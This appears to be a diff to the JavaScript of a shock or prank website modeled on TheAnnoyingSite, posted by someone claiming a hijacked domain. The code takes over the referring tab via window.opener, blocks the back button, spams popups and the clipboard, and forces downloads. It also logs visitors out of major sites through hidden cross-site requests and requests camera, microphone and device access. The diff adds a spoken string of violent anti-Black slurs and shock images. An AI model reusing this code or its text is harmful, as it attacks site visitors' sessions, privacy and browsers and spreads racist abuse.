@@ -1,12 +1,13 @@
-// Cloudflare is burning in hell
-// also this script is entirely pasted from tileman.42web.io
+// soyjakwiki.org/Joyjak.party: >The link then got hijacked by an offsiter on July 21, 2026 and now shown dreamybull porn instead of 'slot edits
+// I have always been the owner. I've added the old joyjack.party gemmies back but from what I've seen in the raid threads nuswa seem to enjoy thugs as well so they're staying.
+// Cloudflare isn't giving me access to the old website files. New script pasted from tileman.42web.io, added my own modifications to it.
 // download-cliff.org
 
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 600
 const WIN_HEIGHT = 400
-const VELOCITY = 50 
+const VELOCITY = 50
 const MARGIN = 15
 const TOP_MARGIN = 50
 const TICK_LENGTH = 50
@@ -14,7 +15,7 @@ const TICK_LENGTH = 50
 const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 
 const ART = [
-   `
+  `
 â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿâ ›â¢‰â¢‰â ‰â ‰â »â£¿â£¿â£¿â£¿â£¿â£¿
 â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿâ  â¡°â£•â£—â£·â£§â£€â£…â ˜â£¿â£¿â£¿â£¿â£¿
 â£¿â£¿â£¿â£¿â£¿â£¿â ƒâ£ â£³â£Ÿâ£¿â£¿â£·â£¿â¡¿â£œâ „â£¿â£¿â£¿â£¿â£¿
@@ -36,7 +37,7 @@ const ART = [
 â£¿â£¿â¡¿â ›â ‰â â „â¢•â¡³â£½â¡¾â£¿â¢½â£¯â¡¿â£®â¢šâ£…â ¹â£¿â£¿â£¿
 â¡¿â ‹â „â „â „â „â¢€â ’â â£žâ¢¿â¡¿â£¿â£½â¢¿â¡½â£§â£³â¡…â Œâ »â£¿
 â â „â „â „â „â „â â¡â ±â¡±â£»â¡»â£â£®â£Ÿâ£¿â£»â£Ÿâ£»â¡ºâ£Š
-  `,  
+  `,
   `
 â”Šâ”Š â˜†â”Šâ”Šâ”Šâ”Šâ˜†â”Šâ”Šâ˜† â”Šâ”Šâ”Šâ”Šâ”Š
 â”ˆâ”ˆâ”ˆâ”ˆâ•­â”â”â”â”â”â”â•®â”Šâ˜† â”Šâ”Š
@@ -87,15 +88,18 @@ const VIDEOS = [
   'https://lol.tf/G1oPuuY.mp4',
 ]
 
-const FILE_DOWNLOADS = [
-  'poop_virus.gif',
-  'caption.gif'
+const geggyImages = [
+  "SEMEN_RETENTION.gif",
+  "RAISINSKIN.gif",
+  "cadocompetition.gif",
 ]
 
-const PHRASES = [
-  'fuck all niggers they can burn hell fuck rosa parks ill sslap that bitch aswell, niggers can burn, niggers cant learn, niggers cant pass class nigger cant learn',
-  'fuck all niggers they can burn hell fuck rosa parks ill sslap that bitch aswell, niggers can burn, niggers cant learn, niggers cant pass class nigger cant learn',
-  'fuck all niggers they can burn hell fuck rosa parks ill sslap that bitch aswell, niggers can burn, niggers cant learn, niggers cant pass class nigger cant learn'
+const FILE_DOWNLOADS = [
+  'poop_virus.gif',
+  'caption.gif',
+  "SEMEN_RETENTION.gif",
+  "RAISINSKIN.gif",
+  "cadocompetition.gif",
 ]
 
 const LOGOUT_SITES = {
@@ -184,7 +188,7 @@ else initParentWindow()
 /**
  * Initialization code for *both* parent and child windows.
  */
-function init () {
+function init() {
   confirmPageUnload()
 
   interceptUserInput(event => {
@@ -240,12 +244,13 @@ function init () {
 /**
  * Initialization code for child windows.
  */
-function initChildWindow () {
+function initChildWindow() {
   registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
   setupFollowWindow()
   startVideo()
+  startImages()
   detectWindowClose()
   triggerFileDownload()
   speak()
@@ -262,7 +267,7 @@ function initChildWindow () {
 /**
  * Initialization code for parent windows.
  */
-function initParentWindow () {
+function initParentWindow() {
   showHelloMessage()
   blockBackButton()
   fillHistory()
@@ -275,12 +280,13 @@ function initParentWindow () {
       attemptToTakeoverReferrerWindow()
       hideCursor()
       startVideo()
+      startImages()
       startAlertInterval()
       superLogout()
       removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
-      speak('That was a mistake')
+      speak('geg geg geg geg geggy')
     }
   })
 }
@@ -292,7 +298,7 @@ function initParentWindow () {
  * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
  * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
  */
-function attemptToTakeoverReferrerWindow () {
+function attemptToTakeoverReferrerWindow() {
   if (isParentWindow && window.opener && !isParentSameOrigin()) {
     window.opener.location = `${window.location.origin}/?child=true`
   }
@@ -303,7 +309,7 @@ function attemptToTakeoverReferrerWindow () {
  * that `window.opener` is set, because that will also get set if a site on a
  * different origin links to theannoyingsite.com with `target='_blank'`.
  */
-function isParentSameOrigin () {
+function isParentSameOrigin() {
   try {
     // May throw an exception if `window.opener` is on another origin
     return window.opener.location.origin === window.location.origin
@@ -317,7 +323,7 @@ function isParentSameOrigin () {
  * this will not actually do anything unless the user has at least one interaction
  * with the page before they close it.
  */
-function confirmPageUnload () {
+function confirmPageUnload() {
   window.addEventListener('beforeunload', event => {
     speak('Please don\'t go!')
     event.returnValue = true
@@ -328,7 +334,7 @@ function confirmPageUnload () {
  * Attempt to register all possible browser-whitelisted protocols to be handled by
  * this web app instead of their default handlers.
  */
-function registerProtocolHandlers () {
+function registerProtocolHandlers() {
   if (typeof navigator.registerProtocolHandler !== 'function') return
 
   const protocolWhitelist = [
@@ -365,9 +371,9 @@ function registerProtocolHandlers () {
  * Attempt to access the user's camera and microphone, and attempt to enable the
  * torch (i.e. camera flash) if the device has one.
  */
-function requestCameraAndMic () {
+function requestCameraAndMic() {
   if (!navigator.mediaDevices ||
-      typeof navigator.mediaDevices.getUserMedia !== 'function') {
+    typeof navigator.mediaDevices.getUserMedia !== 'function') {
     return
   }
 
@@ -398,7 +404,7 @@ function requestCameraAndMic () {
  * Animating the URL with emojis
  * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
  */
-function animateUrlWithEmojis () {
+function animateUrlWithEmojis() {
   if (window.ApplePaySession) {
     // Safari doesn't show the full URL anyway, so we can't animate it
     return
@@ -412,7 +418,7 @@ function animateUrlWithEmojis () {
     animateUrlWithMoons()
   }
 
-  function animateUrlWithBabies () {
+  function animateUrlWithBabies() {
     const e = ['ðŸ»', 'ðŸ¼', 'ðŸ½', 'ðŸ¾', 'ðŸ¿']
 
     setInterval(() => {
@@ -428,7 +434,7 @@ function animateUrlWithEmojis () {
     }, 100)
   }
 
-  function animateUrlWithWave () {
+  function animateUrlWithWave() {
     setInterval(() => {
       let i; let n; let s = ''
 
@@ -442,7 +448,7 @@ function animateUrlWithEmojis () {
     }, 100)
   }
 
-  function animateUrlWithMoons () {
+  function animateUrlWithMoons() {
     const f = ['ðŸŒ‘', 'ðŸŒ˜', 'ðŸŒ—', 'ðŸŒ–', 'ðŸŒ•', 'ðŸŒ”', 'ðŸŒ“', 'ðŸŒ’']
     const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
     let m = 0
@@ -486,7 +492,7 @@ function animateUrlWithEmojis () {
  * Lock the user's pointer, without even being in full screen!
  * Require user-initiated event.
  */
-function requestPointerLock () {
+function requestPointerLock() {
   const requestPointerLockApi = (
     document.body.requestPointerLock ||
     document.body.webkitRequestPointerLock ||
@@ -501,7 +507,7 @@ function requestPointerLock () {
  * Start vibrating the device at random intervals, on supported devices.
  * Requires user-initiated event.
  */
-function startVibrateInterval () {
+function startVibrateInterval() {
   if (typeof window.navigator.vibrate !== 'function') return
   setInterval(() => {
     const duration = Math.floor(Math.random() * 600)
@@ -528,7 +534,7 @@ function startVibrateInterval () {
 /**
  * Intercept all user-initiated events and call the given the function, `onInput`.
  */
-function interceptUserInput (onInput) {
+function interceptUserInput(onInput) {
   document.body.addEventListener('touchstart', onInput, { passive: false })
 
   document.body.addEventListener('mousedown', onInput)
@@ -544,7 +550,7 @@ function interceptUserInput (onInput) {
  * Start an invisible, muted video so we have a one ready to put into
  * picture-in-picture mode on the first user-interaction.
  */
-function startInvisiblePictureInPictureVideo () {
+function startInvisiblePictureInPictureVideo() {
   const video = document.createElement('video')
   video.src = getRandomArrayEntry(VIDEOS)
   video.loop = true
@@ -560,7 +566,7 @@ function startInvisiblePictureInPictureVideo () {
  * Active Safari's picture-in-picture feature, which let's show a video on the
  * desktop. Requires user-initiated event.
  */
-function enablePictureInPicture () {
+function enablePictureInPicture() {
   const video = document.querySelector('video')
   if (document.pictureInPictureEnabled) {
     video.style = ''
@@ -573,7 +579,7 @@ function enablePictureInPicture () {
 /**
  * Focus all child windows. Requires user-initiated event.
  */
-function focusWindows () {
+function focusWindows() {
   wins.forEach(win => {
     if (!win.closed) win.focus()
   })
@@ -582,7 +588,7 @@ function focusWindows () {
 /**
  * Open a new popup window. Requires user-initiated event.
  */
-function openWindow () {
+function openWindow() {
   const { x, y } = getRandomCoords()
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
   const win = window.open(window.location.pathname, '', opts)
@@ -597,7 +603,7 @@ function openWindow () {
 /**
  * Hide the user's cursor!
  */
-function hideCursor () {
+function hideCursor() {
   document.querySelector('html').style = 'cursor: none;'
 }
 
@@ -606,7 +612,7 @@ function hideCursor () {
  * interaction. Further file downloads should happen in response to a user-initiated
  * event or they will be blocked.
  */
-function triggerFileDownload () {
+function triggerFileDownload() {
   const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
   const a = document.createElement('a')
   a.href = fileName
@@ -617,8 +623,8 @@ function triggerFileDownload () {
 /**
  * Speak the given `phrase` using text-to-speech.
  */
-function speak (phrase) {
-  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
+function speak(phrase) {
+  if (phrase == null) phrase = 'fuck all niggers they can burn in hell. geg geg geg geggy. fuck rosa parks ill slap that bitch as well. niggers can burn, niggers cant learn, niggers cant pass class, nigger cant learn.';
   window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
 }
 
@@ -628,7 +634,7 @@ function speak (phrase) {
  * event.
  * Based on https://github.com/feross/TheAnnoyingSite.com/pull/2
  */
-function startTheramin () {
+function startTheramin() {
   const audioContext = new AudioContext()
   const oscillatorNode = audioContext.createOscillator()
   const gainNode = audioContext.createGain()
@@ -666,7 +672,7 @@ function startTheramin () {
  * Attempt to read the user's clipboard.
  * Requires user-initiated event.
  */
-function requestClipboardRead () {
+function requestClipboardRead() {
   try {
     navigator.clipboard.readText().then(
       data => {
@@ -675,16 +681,16 @@ function requestClipboardRead () {
           window.alert("Successfully read data from clipboard: '" + data + "'")
         }
       },
-      () => {}
+      () => { }
     )
-  } catch {}
+  } catch { }
 }
 
 /**
  * Request Webauthn attestation.
  * Requires user-initiated event.
  */
-function requestWebauthnAttestation () {
+function requestWebauthnAttestation() {
   try {
     // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
     // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
@@ -692,7 +698,7 @@ function requestWebauthnAttestation () {
     // sample arguments for registration
     const createCredentialDefaultArgs = {
       publicKey: {
-      // Relying Party (a.k.a. - Service):
+        // Relying Party (a.k.a. - Service):
         rp: {
           name: 'Acme'
         },
@@ -735,8 +741,8 @@ function requestWebauthnAttestation () {
     // register / create a new credential
     navigator.credentials.create(createCredentialDefaultArgs)
       .then((cred) => {
-      // normally the credential IDs available for an account would come from a server
-      // but we can just copy them from above...
+        // normally the credential IDs available for an account would come from a server
+        // but we can just copy them from above...
         const idList = [{
           id: cred.rawId,
           transports: ['usb', 'nfc', 'ble'],
@@ -745,26 +751,26 @@ function requestWebauthnAttestation () {
         getCredentialDefaultArgs.publicKey.allowCredentials = idList
         return navigator.credentials.get(getCredentialDefaultArgs)
       })
-  } catch {}
+  } catch { }
 }
 
 /**
  * Request access to MIDI devices.
  * Requires user-initiated event.
  */
-function requestMidiAccess () {
+function requestMidiAccess() {
   try {
     navigator.requestMIDIAccess({
       sysex: true
     })
-  } catch {}
+  } catch { }
 }
 
 /**
  * Request access to Bluetooth devices.
  * Requires user-initiated event.
  */
-function requestBluetoothAccess () {
+function requestBluetoothAccess() {
   try {
     navigator.bluetooth.requestDevice({
       // filters: [...] <- Prefer filters to save energy & show relevant devices.
@@ -772,43 +778,43 @@ function requestBluetoothAccess () {
       acceptAllDevices: true
     })
       .then(device => device.gatt.connect())
-  } catch {}
+  } catch { }
 }
 
 /**
  * Request access to USB devices.
  * Requires user-initiated event.
  */
-function requestUsbAccess () {
+function requestUsbAccess() {
   try {
     navigator.usb.requestDevice({ filters: [{}] })
-  } catch {}
+  } catch { }
 }
 
 /**
  * Request access to Serial devices.
  * Requires user-initiated event.
  */
-function requestSerialAccess () {
+function requestSerialAccess() {
   try {
     navigator.serial.requestPort({ filters: [] })
-  } catch {}
+  } catch { }
 }
 
 /**
  * Request access to HID devices.
  * Requires user-initiated event.
  */
-function requestHidAccess () {
+function requestHidAccess() {
   try {
     navigator.hid.requestDevice({ filters: [] })
-  } catch {}
+  } catch { }
 }
 
 /**
  * Move the window around the screen and bounce off of the screen edges.
  */
-function moveWindowBounce () {
+function moveWindowBounce() {
   let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
   let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
 
@@ -830,7 +836,7 @@ function moveWindowBounce () {
 /**
  * Follow the user's mouse
  */
-function setupFollowWindow () {
+function setupFollowWindow() {
   document.addEventListener('mousemove', function (e) {
     window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2))
   })
@@ -839,7 +845,7 @@ function setupFollowWindow () {
 /**
  * Show a random troll video in the window.
  */
-function startVideo () {
+function startVideo() {
   const video = document.createElement('video')
 
   video.src = getRandomArrayEntry(VIDEOS)
@@ -851,10 +857,25 @@ function startVideo () {
 }
 
 /**
+ * Show a couple images in the window.
+ */
+function startImages() {
+  for (let i = 0; i < (isChildWindow ? 3 : 10); i++) {
+    const img = document.createElement('img');
+    img.src = '/' + geggyImages[i % geggyImages.length];
+    img.style.position = 'absolute';
+
+    img.style.top = Math.random() * SCREEN_HEIGHT + 'px';
+    img.style.left = Math.random() * SCREEN_WIDTH + 'px';
+    document.body.appendChild(img);
+  }
+}
+
+/**
  * When a child window closes, notify the parent window so it can remove it from
  * the list of child windows.
  */
-function detectWindowClose () {
+function detectWindowClose() {
   window.addEventListener('unload', () => {
     if (!window.opener.closed) window.opener.onCloseWindow(window)
   })
@@ -863,7 +884,7 @@ function detectWindowClose () {
 /**
  * Handle a child window closing.
  */
-function onCloseWindow (win) {
+function onCloseWindow(win) {
   const i = wins.indexOf(win)
   if (i >= 0) wins.splice(i, 1)
 }
@@ -871,7 +892,7 @@ function onCloseWindow (win) {
 /**
  * Show the unsuspecting user a friendly hello message with a cat.
  */
-function showHelloMessage () {
+function showHelloMessage() {
   const template = document.querySelector('template')
   const clone = document.importNode(template.content, true)
   document.body.appendChild(clone)
@@ -880,7 +901,7 @@ function showHelloMessage () {
 /**
  * Remove the hello message.
  */
-function removeHelloMessage () {
+function removeHelloMessage() {
   const helloMessage = document.querySelector('.hello-message')
   helloMessage.remove()
 }
@@ -888,8 +909,8 @@ function removeHelloMessage () {
 /**
  * Change the theme color of the browser in a loop.
  */
-function rainbowThemeColor () {
-  function zeroFill (width, number, pad = '0') {
+function rainbowThemeColor() {
+  function zeroFill(width, number, pad = '0') {
     width -= number.toString().length
     if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
     return number + ''
@@ -904,7 +925,7 @@ function rainbowThemeColor () {
 /**
  * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
  */
-function copySpamToClipboard () {
+function copySpamToClipboard() {
   const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://playdoom.neocities.org'
   clipboardCopy(randomArt)
 }
@@ -913,7 +934,7 @@ function copySpamToClipboard () {
  * Copy given text, `text`, onto the user's clipboard.
  * Requires user-initiated event.
  */
-function clipboardCopy (text) {
+function clipboardCopy(text) {
   // A <span> contains the text to copy
   const span = document.createElement('span')
   span.textContent = text
@@ -960,7 +981,7 @@ function clipboardCopy (text) {
  * Except in Chrome 64+, where modals can only capture focus from other OS apps,
  * but not from other tabs.
  */
-function startAlertInterval () {
+function startAlertInterval() {
   setInterval(() => {
     if (Math.random() < 0.5) {
       showAlert()
@@ -973,7 +994,7 @@ function startAlertInterval () {
 /**
  * Show an alert with 1000's of lines of cat ASCII art.
  */
-function showAlert () {
+function showAlert() {
   const randomArt = getRandomArrayEntry(ART)
   const longAlertText = Array(200).join(randomArt)
   window.alert(longAlertText)
@@ -982,7 +1003,7 @@ function showAlert () {
 /**
  * Fullscreen the browser window
  */
-function requestFullscreen () {
+function requestFullscreen() {
   const requestFullscreen = Element.prototype.requestFullscreen ||
     Element.prototype.webkitRequestFullscreen ||
     Element.prototype.mozRequestFullScreen ||
@@ -995,8 +1016,8 @@ function requestFullscreen () {
  * Log the user out of top sites they're logged into, including Google.com.
  * Inspired by https://superlogout.com
  */
-function superLogout () {
-  function cleanup (el, delayCleanup) {
+function superLogout() {
+  function cleanup(el, delayCleanup) {
     if (delayCleanup) {
       delayCleanup = false
       return
@@ -1004,7 +1025,7 @@ function superLogout () {
     el.parentNode.removeChild(el)
   }
 
-  function get (url) {
+  function get(url) {
     const img = document.createElement('img')
     img.onload = () => cleanup(img)
     img.onerror = () => cleanup(img)
@@ -1013,7 +1034,7 @@ function superLogout () {
     img.src = url
   }
 
-  function post (url, params) {
+  function post(url, params) {
     const iframe = document.createElement('iframe')
     iframe.style = HIDDEN_STYLE
     iframe.name = 'iframe' + numSuperLogoutIframes
@@ -1068,7 +1089,7 @@ function superLogout () {
 /**
  * Disable the back button. If the user goes back, send them one page forward ;-)
  */
-function blockBackButton () {
+function blockBackButton() {
   window.addEventListener('popstate', () => {
     window.history.forward()
   })
@@ -1078,7 +1099,7 @@ function blockBackButton () {
  * Fill the history with extra entries for this site, to make it harder to find
  * the previous site in the back button's dropdown menu.
  */
-function fillHistory () {
+function fillHistory() {
   for (let i = 1; i < 20; i++) {
     window.history.pushState({}, '', window.location.pathname + '?q=' + i)
   }
@@ -1090,7 +1111,7 @@ function fillHistory () {
  * Get random x, y coordinates for a new window on the screen. Takes into account
  * screen size, window size, and leaves a safe margin on all sides.
  */
-function getRandomCoords () {
+function getRandomCoords() {
   const x = MARGIN +
     Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
   const y = TOP_MARGIN +
@@ -1101,12 +1122,12 @@ function getRandomCoords () {
 /**
  * Get a random element from a given array, `arr`.
  */
-function getRandomArrayEntry (arr) {
+function getRandomArrayEntry(arr) {
   return arr[Math.floor(Math.random() * arr.length)]
 }
 
 // TODO: document this
-function setupSearchWindow (win) {
+function setupSearchWindow(win) {
   if (!win) return
   const { x, y } = getRandomCoords()
   win.moveTo(x, y)
@@ -1138,7 +1159,7 @@ function setupSearchWindow (win) {
   }, 3000)
 }
 
-function detectBrowser () {
+function detectBrowser() {
   const userAgent = navigator.userAgent
   if (/samsungbrowser\//i.test(userAgent)) {
     return 'samsung'
